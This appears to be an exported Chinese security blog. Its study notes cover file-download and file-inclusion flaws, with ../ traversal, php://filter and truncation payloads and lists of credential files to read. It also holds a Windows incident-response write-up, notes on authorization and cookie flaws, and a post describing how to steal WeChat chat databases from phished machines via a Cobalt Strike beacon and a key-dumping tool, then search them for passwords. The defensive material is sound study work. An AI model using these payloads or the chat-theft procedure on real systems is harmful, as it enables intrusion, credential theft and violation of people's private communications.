<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">PHP</span></span><br><span class="line">1、获取inc/config·php获得数据库连接字符串中的口令信息。</span><br><span class="line"><span class="meta">#</span><span class="bash">asp</span></span><br><span class="line">1、获取inc/conn.asp文件，获得数据库连接字符串，得到数据库口令。若是ACCESS数据库，可以得到数据库</span><br><span class="line">路径，在下载数据库内容。</span><br><span class="line"><span class="meta">#</span><span class="bash">aspx</span></span><br><span class="line">1、获取网站根目录web，config文件，获得数据库连接字符串中的口令信息。</span><br><span class="line">2、获取bin/*.dll文件，获取网站源码（不完整代码）。使用.NET refl ector工具打开编译后的dll文件。</span><br><span class="line"><span class="meta">#</span><span class="bash">JSP</span></span><br><span class="line">1、获取conf/tomcat-user.xml文件，获得tomcat管理界面的口令信息，上传war包GetShel1，</span><br><span class="line">2、获取WEB-INF/Web.xml文件，获得数据库连接字符串中的口令信息。</span><br></pre></td></tr></table></figure>

<p><strong>应用，系统配置文件</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">一、Windows</span><br><span class="line">C:\boot.ini<span class="regexp">//</span>查看系统版本C:\Windows\System32\inetsrv\MetaBase.xml<span class="regexp">//</span>IIS配置文件</span><br><span class="line">C:\Windows\repair\sam<span class="regexp">//</span>存储系统初次安装的密码</span><br><span class="line">C:\Program Files\mysql\my.ini<span class="regexp">//</span>Mysql配置</span><br><span class="line">C:\Program Files\mysql\data\mysql\user.MYD <span class="regexp">//</span>Mysql root</span><br><span class="line">C:\Windows\php.ini<span class="regexp">//</span>php配置信息</span><br><span class="line">C:\Windows\my.ini<span class="regexp">//</span>Mysql配置信息</span><br><span class="line">C:\Windows\win.ini<span class="regexp">//</span>Windows系统的一个基本系统配置文件</span><br><span class="line">二、Linux</span><br><span class="line"><span class="regexp">/root/</span>.ssh/authorized_keys</span><br><span class="line"><span class="regexp">/root/</span>.ssh/id_rsa</span><br><span class="line"><span class="regexp">/root/</span>.ssh/id_ras.keystore</span><br><span class="line"><span class="regexp">/root/</span>.ssh<span class="regexp">/known_hosts/</span><span class="regexp">/记录每个访问计算机用户的公钥/</span>etc/passwd</span><br><span class="line"><span class="regexp">/etc/</span>shadow</span><br><span class="line"><span class="regexp">/etc/my</span>.cnf<span class="regexp">//my</span>sql配置文件</span><br><span class="line"><span class="regexp">/etc/</span>httpd<span class="regexp">/conf/</span>httpd.conf<span class="regexp">//</span>apachel配置文件</span><br><span class="line"><span class="regexp">/root/</span>.bash_history<span class="regexp">//</span>用户历史命令记录文件</span><br><span class="line"><span class="regexp">/root/</span>.mysql._history<span class="regexp">//my</span>sql历史命令记录文件</span><br></pre></td></tr></table></figure>

<h2 id="任意文件下载漏洞防御"><a href="#任意文件下载漏洞防御" class="headerlink" title="任意文件下载漏洞防御"></a>任意文件下载漏洞防御</h2><figure class="highlight less"><table><tr><td class="code"><pre><span class="line">下载路径不可控，而是程序自动生成后保存在数据库中，根据<span class="selector-tag">ID</span>进行下载</span><br><span class="line">对参数做严格的过滤，不能进行目录遍历（穿越）</span><br><span class="line">对下载路径进行过滤，如下载前对传入的参数进行过滤，并且对下载文件类型进行检查，是否是允许下载的类型</span><br><span class="line">过滤.(点)，使用户在<span class="selector-tag">url</span>中不能回溯上级目录</span><br><span class="line">正则严格判断用户输入参数的格式</span><br><span class="line">限定文件访问范围如<span class="selector-tag">PHP</span>里的（<span class="selector-tag">php</span><span class="selector-class">.ini</span>配置<span class="selector-tag">open_basedir</span>）</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含漏洞个人总结</title>
    <url>/2022/03/08/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="什么是文件包含"><a href="#什么是文件包含" class="headerlink" title="什么是文件包含"></a>什么是文件包含</h2><p>程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。为了控制代码的灵活，程序要把要使用的函数写到一个文件中，其他需要其中的的函数执行，只需要通过该文件名包含进来，而且没有进行验证。</p>
<span id="more"></span>

<h2 id="文件包含分类"><a href="#文件包含分类" class="headerlink" title="文件包含分类"></a>文件包含分类</h2><p><strong>本地包含</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">当被包含的文件在服务器本地时，且能够读取或执行包含本地文件的漏洞，称为本地文件包含漏洞</span><br></pre></td></tr></table></figure>

<p><strong>远程包含</strong></p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">远程文件包含和本地文件包含造成漏洞的原因是一样的，当开发配置可以读取远程文件时，例如php.ini 中的配置选项allow_url_fopen和allow_url_include为<span class="keyword">ON</span>的话，则包含的文件可以是第三方服务器中的文件，这样就形成了远程文件包含漏洞。</span><br><span class="line">代码限制：代码里面限制只能包含本地文件的话就不会有远程包含，如果没限制的话，并且在设置上允许包含远程文件的话，就会引起远程包含</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">通过文件以脚本去执行</span><br><span class="line">文件包含常用函数</span><br><span class="line"><span class="function"><span class="title">include</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">require</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">fopen</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">include_once</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">require_once</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">readfile</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>

<h2 id="如何检测"><a href="#如何检测" class="headerlink" title="如何检测"></a>如何检测</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">漏扫工具</span><br><span class="line">公开漏洞</span><br><span class="line">手工看参数以及功能点</span><br><span class="line"><span class="number">1</span>、通过观察参数特征猜测是否使用文件包含，文件包含参数后面为具体文件名如：http:<span class="regexp">//</span>example.com/index.php?page=include.php</span><br><span class="line">http:<span class="regexp">//</span>example.com/index.php?page=include</span><br><span class="line"><span class="number">2</span>、通过..<span class="regexp">/目录跳转符尝试读取系统文件、服务器日志文件或者配置文件。如读取Linux的/</span>etc<span class="regexp">/passwd文件: http:/</span><span class="regexp">/example.com/i</span>ndex.php?page=..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"><span class="number">3</span>、通过php:<span class="regexp">//</span>filter<span class="regexp">/convert.base64-encode/</span>resource=index.php读取代码文件。</span><br><span class="line"><span class="number">4</span>、通过包含远程服务器上的PHP代码文件执行代码。</span><br><span class="line"><span class="number">5</span>、如果站点存在一个文件上传功能，只允许图片类型文件，并且存在文件包含漏洞，则可以把PHP代码写入图片文件中，再通过文件包含漏洞包含之，进而执行PHP代码。</span><br><span class="line"><span class="number">6</span>、如果文件的后缀可考虑使用截断进行包含：</span><br><span class="line">  <span class="number">1</span>)%<span class="number">00</span>截断（PHP小于<span class="number">5.3</span>.<span class="number">4</span>，magic_quotes_gpc=off）</span><br><span class="line">  <span class="number">2</span>)路径长度截断：</span><br><span class="line">  <span class="regexp">/etc/</span>passwd<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.[n*/.]（Linux文件名需要长于<span class="number">4096</span>，Windows 需要长于<span class="number">256</span>）</span><br></pre></td></tr></table></figure>

<h2 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">1.读取目标机上敏感文件</span><br><span class="line">2.远程文件包含可运行的PHP木马</span><br><span class="line">3、配合文件上传漏洞获取webshll</span><br></pre></td></tr></table></figure>

<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">固定文件后缀</span><br><span class="line">固定使用的文件</span><br><span class="line">安装WAF</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次windows应急响应</title>
    <url>/2022/04/24/%E8%AE%B0%E4%B8%80%E6%AC%A1windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
    <content><![CDATA[<h1 id="1、背景"><a href="#1、背景" class="headerlink" title="1、背景"></a>1、背景</h1><p>大好假期，人在家中躺，应急天上来，上了机子之后过程还算是比较顺利的，环境是Tomcat，大致思路就是，排查可疑用户和文件，看日志，连接情况，进程，定时任务，注册表这些。</p>
<span id="more"></span>
<h1 id="2、排查可疑用户和文件"><a href="#2、排查可疑用户和文件" class="headerlink" title="2、排查可疑用户和文件"></a>2、排查可疑用户和文件</h1><p>先排查下有没有隐藏的用户</p>
<p><img src="https://ax-x.github.io/2022/04/24/%E8%AE%B0%E4%B8%80%E6%AC%A1windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20220404011544732.png" alt="image-20220404011544732"></p>
<p>用了net user和net user localgroup administrators都没办法看到，但是还是有可能存在隐藏用户，隐藏用户有三种方式：</p>
<table>
<thead>
<tr>
<th>方式</th>
<th>特定</th>
</tr>
</thead>
<tbody><tr>
<td>命令添加</td>
<td>net user没办法查看隐藏用户<br>RDP登录过的，都会生成对应的用户目录<br>系统登录界面可以选择登录用户</td>
</tr>
<tr>
<td>克隆账号</td>
<td>net user无法查看隐藏用户<br>RDP登录不会生成相应的用户目录<br>系统登录界面选择登录用户，无法查看</td>
</tr>
<tr>
<td>Guest账号利用</td>
<td>正常都能够查看出来，但是一般会被忽略，隐蔽性相对来说会高点</td>
</tr>
</tbody></table>
<p>建议开个PCHunter看下，一般都能查出来，看出来这边是存在一个test$的隐藏用户，用net user XXX$验证下</p>
<p><img src="https://ax-x.github.io/2022/04/24/%E8%AE%B0%E4%B8%80%E6%AC%A1windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20220404021642321.png" alt="image-20220404021642321"></p>
<p><img src="https://ax-x.github.io/2022/04/24/%E8%AE%B0%E4%B8%80%E6%AC%A1windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20220404022054841.png" alt="image-20220404022054841"></p>
<p>接着看下有没有可疑的文件在，先排查web的目录，后面再去看看系统有没有被放了CS马啥的，因为是部署的tomcat，一般站点文件都会部署在tomcat\webapps下面，先按照修改时间排序下，发现了两个不像好人的文件，打开代码一看，一个是webshell，一个是代理</p>
<p><img src="https://ax-x.github.io/2022/04/24/%E8%AE%B0%E4%B8%80%E6%AC%A1windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20220404023530823.png" alt="image-20220404023530823"></p>
<p>这次是运气好，直接用时间排序查出来的文件，在找webshell和代理的时候，根据日志的访问记录和文件修改时间去查找效果会更好一点，日志能看到攻击者一直在访问那个文件，这样在定位webshell的时候会更加有目标一点，或者使用D盾扫描，也能扫描出webshell。</p>
<p><img src="https://ax-x.github.io/2022/04/24/%E8%AE%B0%E4%B8%80%E6%AC%A1windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20220404125014083.png" alt="image-20220404125014083"></p>
<h1 id="3、定位机器失陷时间"><a href="#3、定位机器失陷时间" class="headerlink" title="3、定位机器失陷时间"></a>3、定位机器失陷时间</h1><p>有挺多种方法去定位的，看系统安全日志或者中间件的日志等等，这边我先去看的tomcat的日志，tomcat的日志分五种：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. 应用日志</span><br><span class="line">该日志主要是记录应用事件的，针对应用级别的排错比较有用，比如应用性能比较慢。</span><br><span class="line">2. 服务器日志</span><br><span class="line">服务器日志和console日志是相同的，不同之处在于，服务器日志是保存在文件中的，可以随时查看。</span><br><span class="line">3. 控制台日志</span><br><span class="line">该日志记录了tomcat的启动和加载器的顺序的详细信息，该日志文件叫做catalina.out。在排查服务器启动、应用的部署错时比较有用。 配置日志是在catalina.sh中配置的。</span><br><span class="line">4. 访问日志</span><br><span class="line">该日志也非常重要，在分析很多应用的流量，带宽需求，及负载时非常有用。该日志是在server.xml中配置的。</span><br><span class="line">5. Host manager</span><br><span class="line">使用Tomcat Manager执行的活动日志，比如不同的任务执行，应用的状态，应用的部署，和tomcat的生命周期，这些配置是在logging.properties.</span><br></pre></td></tr></table></figure>

<p>如果是因为站点有漏洞被传了马上去，可以看下localhost_access_log这个日志，这个是访问tomcat的日志，请求时间和资源，状态码都有记录，在日志量大的情况下可以自己去定义下，筛选文件和状态码，先把200的状态码筛选出来，然后再根据上面定位到的webshell去搜索日志信息。所以我第一时间先去找webshell，就是方便现在去定位大概攻击成功的时间和文件。</p>
<p><img src="https://ax-x.github.io/2022/04/24/%E8%AE%B0%E4%B8%80%E6%AC%A1windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20220404131319354.png" alt="image-20220404131319354"></p>
<h1 id="4、计划任务-amp-注册表"><a href="#4、计划任务-amp-注册表" class="headerlink" title="4、计划任务&amp;注册表"></a>4、计划任务&amp;注册表</h1><p>计划任务的查看有很多种方式</p>
<table>
<thead>
<tr>
<th>方式</th>
<th>特点</th>
</tr>
</thead>
<tbody><tr>
<td>at（适用于win2003-win2008）</td>
<td>包含大量系统计划任务，不容易排查</td>
</tr>
<tr>
<td>schtasks.exe（win2008及其以后系统）</td>
<td>包含大量系统计划任务，不容易排查</td>
</tr>
<tr>
<td>控制面板-&gt;计划任务</td>
<td>包含大量系统计划任务，不容易排查</td>
</tr>
</tbody></table>
<p>单独看一个地方的话，会参杂大量的计划任务，干扰检查，最好就是多个搭配起来，配合计划任务的文件去检查，通过查看目录修改日期-&gt;文件修改日期，根据这两个信息，去计划任务程序里面定位，然后再查看具体内容，这就是为什么要去定位攻击成功的时间了，能有效帮助我们去排查计划任务的创建时间。</p>
<p><img src="https://ax-x.github.io/2022/04/24/%E8%AE%B0%E4%B8%80%E6%AC%A1windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20220404135302797.png" alt="image-20220404135302797"></p>
<p>打开代码看下，在最下面发现的启动的文件路径</p>
<p><img src="https://ax-x.github.io/2022/04/24/%E8%AE%B0%E4%B8%80%E6%AC%A1windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20220404135655403.png" alt="image-20220404135655403"></p>
<p>打开这个EXE，查看代码，在最下面看到了IP，是个阿里云的服务器，丢云沙箱一看，是个CS马。</p>
<p><img src="https://ax-x.github.io/2022/04/24/%E8%AE%B0%E4%B8%80%E6%AC%A1windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20220404141147090.png" alt="image-20220404141147090"></p>
<p>当然我这种是比较笨的方式，这种可以直接丢云沙箱上面看下结果或者配合CurrPorts去分析，打开这个exe之后观察变化，或者看CurrPorts的log文件，也能够分析出这个IP，只是习惯先编辑一下，看看里面拿到内容，一般拉到最后面都能看到一些东西，找到CS马之后，去看windows自启动的注册表定位起来也会方便点，重点查看windows的自启动配置的注册表。</p>
<p><img src="https://ax-x.github.io/2022/04/24/%E8%AE%B0%E4%B8%80%E6%AC%A1windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20220404142723461.png" alt="image-20220404142723461"></p>
<h1 id="5、总结"><a href="#5、总结" class="headerlink" title="5、总结"></a>5、总结</h1><p>这次的检查算是比较简单的，没有特别难找的东西，有一些是直接找出来的，没有啥特别的技巧，多排查几个机子，就有种直觉，感觉有点问题。最后猜测下攻击链：</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">爆破Tomcat后台</span><br><span class="line">部署webshell、HTTP隧道代理</span><br><span class="line">上<span class="keyword">CS</span>木马进行权限维持</span><br><span class="line">创建后门管理员权限账号（<span class="keyword">test</span>$）</span><br><span class="line">利用 mimikatz 抓取管理员用户的密码</span><br><span class="line">用管理员账号登录服务器</span><br><span class="line">清除操作痕迹（清空安全日志）</span><br><span class="line">利用计划任务、自启动等进行权限维持</span><br></pre></td></tr></table></figure>

<p>在检查的时候，如果遇到很多数据干扰的话可以配合其他方式或者是时间，文件名，状态码去筛选，可以过滤掉绝大多数的垃圾数据再配合一些工具，D盾，PCHunter之类的能让检查顺利很多。</p>
]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>钓鱼场景下微信聊天记录回传</title>
    <url>/2022/10/27/%E9%92%93%E9%B1%BC%E5%9C%BA%E6%99%AF%E4%B8%8B%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%9B%9E%E4%BC%A0/</url>
    <content><![CDATA[<h2 id="一、使用场景"><a href="#一、使用场景" class="headerlink" title="一、使用场景"></a>一、使用场景</h2><p>钓鱼攻击（通过钓鱼 / 微信控到的机器通常都是登录状态）</p>
<p>渗透到运维机器（有些运维机器会日常登录自己的微信）</p>
<p>实战中钓鱼时常在微信聊天记录中找到目标内网系统账号、机器账号密码，尽可能的不触发大量扫描告警下在内网中精准打到跳板机。</p>
<span id="more"></span>
<h2 id="二、获取微信聊天记录过程"><a href="#二、获取微信聊天记录过程" class="headerlink" title="二、获取微信聊天记录过程"></a>二、获取微信聊天记录过程</h2><p>在第一步需要用到，Sharp-dumpkey工具，下面对<strong>Sharp-dumpkey工具进行介绍</strong>：</p>
<p>基于C#实现的获取微信数据库密钥的小工具，可配合chatViewTool使用。可直接执行命令.\dumpkey.exe,查看微信数据库密钥，并回传DBpass.bin文件中。</p>
<p><img src="https://ax-x.github.io/2022/10/27/%E9%92%93%E9%B1%BC%E5%9C%BA%E6%99%AF%E4%B8%8B%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%9B%9E%E4%BC%A0/image-20230413170733607.png" alt="image-20230413170733607"></p>
<p><img src="https://ax-x.github.io/2022/10/27/%E9%92%93%E9%B1%BC%E5%9C%BA%E6%99%AF%E4%B8%8B%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%9B%9E%E4%BC%A0/image-20230413170740349.png" alt="image-20230413170740349"></p>
<ul>
<li> 暂时不支持微信多开场景的密钥获取。</li>
<li> • 需微信登录后才可抓取密钥。</li>
<li> • 程序未采用动态获取基址的方式，因此为保证程序可用性，运行时会在线拉取基址。</li>
</ul>
<p>在被获取权限PC端执行 .\co.exe shellcode -f .\cece.txt，可连接到CS服务器</p>
<p><img src="https://ax-x.github.io/2022/10/27/%E9%92%93%E9%B1%BC%E5%9C%BA%E6%99%AF%E4%B8%8B%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%9B%9E%E4%BC%A0/image-20230413170756093.png" alt="image-20230413170756093"></p>
<p>在被获取权限PC处，右键选择Interact，可进入命令执行</p>
<p><img src="https://ax-x.github.io/2022/10/27/%E9%92%93%E9%B1%BC%E5%9C%BA%E6%99%AF%E4%B8%8B%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%9B%9E%E4%BC%A0/image-20230413170802035.png" alt="image-20230413170802035"></p>
<p><img src="https://ax-x.github.io/2022/10/27/%E9%92%93%E9%B1%BC%E5%9C%BA%E6%99%AF%E4%B8%8B%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%9B%9E%E4%BC%A0/image-20230413170818847.png" alt="image-20230413170818847"></p>
<h4 id="1、获取微信数据库密钥，执行命令execute-assembly-C-Users-summer-Desktop-test-dumpkey-exe"><a href="#1、获取微信数据库密钥，执行命令execute-assembly-C-Users-summer-Desktop-test-dumpkey-exe" class="headerlink" title="1、获取微信数据库密钥，执行命令execute-assembly C:\Users\summer\Desktop\test\dumpkey.exe"></a>1、获取微信数据库密钥，执行命令execute-assembly C:\Users\summer\Desktop\test\dumpkey.exe</h4><p><img src="https://ax-x.github.io/2022/10/27/%E9%92%93%E9%B1%BC%E5%9C%BA%E6%99%AF%E4%B8%8B%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%9B%9E%E4%BC%A0/image-20230413170827305.png" alt="image-20230413170827305"></p>
<p>回传 DBpass.bin，该文件中记录了微信数据库密钥</p>
<p><img src="https://ax-x.github.io/2022/10/27/%E9%92%93%E9%B1%BC%E5%9C%BA%E6%99%AF%E4%B8%8B%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%9B%9E%E4%BC%A0/image-20230413170834611.png" alt="image-20230413170834611"></p>
<h4 id="2、下载目标聊天数据库文件，默认保存目录在以下目录，超出-240MB-会自动生成-MSG1-db，以此类推。"><a href="#2、下载目标聊天数据库文件，默认保存目录在以下目录，超出-240MB-会自动生成-MSG1-db，以此类推。" class="headerlink" title="2、下载目标聊天数据库文件，默认保存目录在以下目录，超出 240MB 会自动生成 MSG1.db，以此类推。"></a>2、下载目标聊天数据库文件，默认保存目录在以下目录，超出 240MB 会自动生成 MSG1.db，以此类推。</h4><p>C:\Users\summer\Documents\WeChat Files\wxid_vd0nxyv6n20t22\Msg\Multi\MSG0.db C:\Users\summer\Documents\WeChat Files\wxid_vd0nxyv6n20t22\Msg\MicroMsg.db</p>
<p><strong>备注：</strong> MSG0.db文件存放聊天记录 MicroMsg.db文件存放好友列表</p>
<p>执行命令shell C:\Users\summer\Desktop\test\FileSearch.exe search C:\ MSG，可找到文件MSG0.</p>
<p><img src="https://ax-x.github.io/2022/10/27/%E9%92%93%E9%B1%BC%E5%9C%BA%E6%99%AF%E4%B8%8B%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%9B%9E%E4%BC%A0/image-20230413170844841.png" alt="image-20230413170844841"></p>
<p>连接被获取权限PC的文件夹，找到目录C:\Users\summer\Documents\WeChat Files\wxid_vd0nxyv6n20t22\Msg\Multi，下载文件MSG0.db并存放到自定义目录即可</p>
<p><img src="https://ax-x.github.io/2022/10/27/%E9%92%93%E9%B1%BC%E5%9C%BA%E6%99%AF%E4%B8%8B%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%9B%9E%E4%BC%A0/image-20230413170852209.png" alt="image-20230413170852209"></p>
<p>找到目录C:\Users\summer\Documents\WeChat Files\wxid_vd0nxyv6n20t22\Msg，下载文件MicroMsg.db并存放到自定义目录（与MSG0.db放到同一目录下）</p>
<p><img src="https://ax-x.github.io/2022/10/27/%E9%92%93%E9%B1%BC%E5%9C%BA%E6%99%AF%E4%B8%8B%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%9B%9E%E4%BC%A0/image-20230413170904727.png" alt="image-20230413170904727"></p>
<p>在第3步之前对<strong>ChatViewTool工具进行介绍</strong>：</p>
<p>ChatViewTool是一个配合dumpkey(微信数据库秘钥获取工具)使用的小工具，该工具实现了微信数据库解密以及展示数据库聊天记录的功能。</p>
<p><img src="https://ax-x.github.io/2022/10/27/%E9%92%93%E9%B1%BC%E5%9C%BA%E6%99%AF%E4%B8%8B%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%9B%9E%E4%BC%A0/image-20230413170911961.png" alt="image-20230413170911961"></p>
<p><strong>使用方法</strong> 在获取数据库秘钥之后将内容保存为文本文件DBPass.Bin，随后提取以下相关的数据库放于秘钥文件同目录。C:\Users\summer\Documents\WeChat Files\wxid_vd0nxyv6n20t22\Msg\Multi\MSG0.db</p>
<p>C:\Users\summer\Documents\WeChat Files\wxid_vd0nxyv6n20t22\Msg\MicroMsg.db</p>
<p>随后打开ChatViewTool点击“数据库解密”并选择秘钥及数据库所在的目录，待解密完成后</p>
<p><img src="https://ax-x.github.io/2022/10/27/%E9%92%93%E9%B1%BC%E5%9C%BA%E6%99%AF%E4%B8%8B%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%9B%9E%E4%BC%A0/image-20230413170918359.png" alt="image-20230413170918359"></p>
<p>点击“查看数据库”选择同目录即可完成会话展示，双击联系人列表可展示对应的聊天记录</p>
<p><img src="https://ax-x.github.io/2022/10/27/%E9%92%93%E9%B1%BC%E5%9C%BA%E6%99%AF%E4%B8%8B%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%9B%9E%E4%BC%A0/image-20230413170925110-1681376967905-1.png" alt="image-20230413170925110"></p>
<p><img src="https://ax-x.github.io/2022/10/27/%E9%92%93%E9%B1%BC%E5%9C%BA%E6%99%AF%E4%B8%8B%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%9B%9E%E4%BC%A0/image-20230413170931102.png" alt="image-20230413170931102"></p>
<h4 id="3、将上面DBpass-bin、MSG0-db、MicroMsg-db三个文件回传到同目录，配合-ChatViewTool-打开解密即可查看，在搜索处-“administrator”-“root”-“密码”-“ip-等”，项目地址。"><a href="#3、将上面DBpass-bin、MSG0-db、MicroMsg-db三个文件回传到同目录，配合-ChatViewTool-打开解密即可查看，在搜索处-“administrator”-“root”-“密码”-“ip-等”，项目地址。" class="headerlink" title="3、将上面DBpass.bin、MSG0.db、MicroMsg.db三个文件回传到同目录，配合 ChatViewTool 打开解密即可查看，在搜索处 “administrator” “root” “密码” “ip 等”，项目地址。"></a>3、将上面DBpass.bin、MSG0.db、MicroMsg.db三个文件回传到同目录，配合 ChatViewTool 打开解密即可查看，在搜索处 “administrator” “root” “密码” “ip 等”，项目地址。</h4><p><img src="https://ax-x.github.io/2022/10/27/%E9%92%93%E9%B1%BC%E5%9C%BA%E6%99%AF%E4%B8%8B%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%9B%9E%E4%BC%A0/image-20230413170937812.png" alt="image-20230413170937812"></p>
]]></content>
      <categories>
        <category>钓鱼</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>微信记录获取</tag>
      </tags>
  </entry>
  <entry>
    <title>逻辑越权</title>
    <url>/2022/01/16/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83/</url>
    <content><![CDATA[<h1 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a><strong>逻辑漏洞</strong></h1><ul>
<li> 攻击者利用业务的设计缺陷，获取敏感信息或破坏业务的完整性， 其本质就是程序逻辑输入管控不严，没有对用户数据进行严格把控，导致程序不能够正常处理或处理错误，一般出现在登录注册、密码找回、信息查看、交易支付金额等。<span id="more"></span></li>
</ul>
<h1 id="逻辑漏洞类型"><a href="#逻辑漏洞类型" class="headerlink" title="逻辑漏洞类型"></a>逻辑漏洞类型</h1><h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><ul>
<li>漏洞介绍：即普通用户/管理员能访问其他普通用户/管理员才能够访问的系统信息或者系统功能</li>
<li>形成原因：在进行方法调用时候未进行请求用户和目标信息拥有者是否匹配一致，直接用userid/email之类的容易遍历的参数进行数据库查询</li>
<li>漏洞点：在普通用户/管理员登录后的能访问的链接或者功能中都可能存在</li>
<li>漏洞修复：在权限管理中，平行越权的权限管理颗粒度最小修复思路需要在方法中进行相关的获取请求request再利用getAttribute(“userid”)获取其userid直接使用该userid作为参数进行数据增删查改，避免userid参数传输</li>
</ul>
<h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><ul>
<li><p>漏洞介绍：即普通用户能够访问管理员甚至超级管理员才能够访问的系统信息或者系统功能</p>
</li>
<li><p>形成原因：程序再方法调用时候，缺少角色等级校验</p>
</li>
<li><p>漏洞点：在任何用户登录后才能访问的链接或者功能中都可能存在对每一个传输的参数都要了解参数的目的，尝试将用户名改为admin尝试绕过</p>
</li>
<li><p>漏洞修复：需要校验用户是否有权限访问这个方法修复思路：获取请求request再利用getAuttribute(“roleid”)获取其角色等级检查角色等级是否合法，错误则直接返回错误跳转，返回页面必须仍然从Attribute中获取userid再进一步查询相关信息值得注意的是切勿将错误跳转写到Javascript里面，还返回目标URL页面的相关信息。</p>
</li>
</ul>
<h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><h3 id="本地加密传输"><a href="#本地加密传输" class="headerlink" title="本地加密传输"></a>本地加密传输</h3><h3 id="cookie脆弱"><a href="#cookie脆弱" class="headerlink" title="cookie脆弱"></a>cookie脆弱</h3><ul>
<li><p>漏洞介绍：通过伪造cookie信息能够伪造其他用户进行登录。</p>
</li>
<li><p>漏洞原理：开发者为了方便将身份信息/登录信息明文或者只是简单编码、哈希之后存放在cookies中，网站通过获取得到的cookies进行授权或者身份验证</p>
</li>
<li><p>漏洞点：cookie中有明显或者只是简单编码、哈希的字段时候 修改lsLogin值为1可以判定为用户已经登录 修改cookie为asp163=UserName=admin</p>
</li>
<li><p>漏洞修复： Cookie不应该存储可理解的身份信息和登录信息 按照规定，cookie对身份信息和登录信息的存储只能通过存储足够长度的随机字符串进行，避免篡改</p>
</li>
</ul>
